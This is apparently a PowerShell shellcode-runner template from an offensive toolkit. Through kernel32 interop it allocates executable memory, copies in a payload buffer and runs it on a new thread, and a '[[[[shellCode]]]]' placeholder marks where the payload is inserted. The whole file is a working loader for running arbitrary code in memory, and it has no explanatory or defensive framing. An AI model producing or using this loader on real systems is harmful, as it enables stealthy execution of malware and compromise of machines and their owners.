$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@
Add-Type $Kernel32

[[[[shellCode]]]]

#Copy payload to memory
$size = $buf.Length
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

#execute the copied memory
$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0)

#wait indefinitely for the new thread so it doesn't close instantly
[Kernel32]::WaitForSingleObject($thandle,[uint32]"0xFFFFFFFF")